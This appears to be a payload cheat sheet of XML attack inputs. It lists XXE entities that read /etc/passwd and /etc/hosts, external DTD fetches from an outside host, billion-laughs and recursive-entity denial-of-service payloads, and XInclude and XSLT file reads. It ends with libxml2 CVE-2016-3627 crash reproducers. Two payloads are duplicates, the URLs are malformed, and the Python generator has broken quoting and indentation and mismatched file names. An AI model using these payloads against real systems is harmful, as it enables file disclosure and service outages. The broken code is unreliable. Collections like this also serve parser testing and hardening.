# XML Payloads
--------------------------------------

## XXE
1.
```
<?xml version="1.0"?>
<!DOCTYPE a [
 <!ENTITY b SYSTEM "file:///etc/hosts">
]>
<a>&b;</a>
```
2.
```
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE a [
 <!ENTITY b SYSTEM "file:///etc/passwd">
]>
<a>&b;</a>
```
3.
```
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE a [
 <!ENTITY b SYSTEM "file:///etc/passwd">
]>
<a>&b;</a>
```

4.
```
<?xml version="1.0"?>
<!DOCTYPE a [
 <!ENTITY % d SYSTEM "http:///hikerell.cn/index.html">
 %d;
]>
<a>&b;</a>
```
5.
```
<?xml version="1.0"?>
<!DOCTYPE b SYSTEM "http:///hikerell.cn/index.html">
<a>&b;</a>
```
6.
```
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">
]>
<data>&a2;</data>
```
7.
```
<!DOCTYPE data [
<!ENTITY a "a&b;" >
<!ENTITY b "&a;" >
]>
<data>&a;</data>
```
8.
```
<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="/etc/hosts"></xi:include></data>
```
9.
```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/">
       <xsl:value-of select="document('/etc/hosts')">
   </xsl:value-of></xsl:template>
</xsl:stylesheet>
```

## CVE-2016-3627 (libxml2)
```
echo '<!DOCTYPE b [ <!ENTITY b "&b;"> ]> <b b="&b;">' | xmllint -recover -
echo '<!DOCTYPE b [ <!ENTITY b "&c;"> <!ENTITY c "&d;"> <!ENTITY d
"&b;">]> <test123="&c;">' | xmllint -recover -
```
Another vunlerability could cause stack overflow before libxml verify xml payload is invalid.
It is related to this cve.
```python
#!/bin/python3
f = open('repo.xml', 'w')
f.write( "<!DOCTYPE a [ ")
i = 1
while (i < 30000):
f.write ("<!ENTITY a" + str(i) + " "&a" + str(i+1) + ";">")
i = i+1
f.write("<!ENTITY a" + str(i+1) + " "&a1;">]> <bruces bogans="&a1;">")
f.close()
```
test with
```shell
python3 repoducer.py ; xmllint repo.xml
```
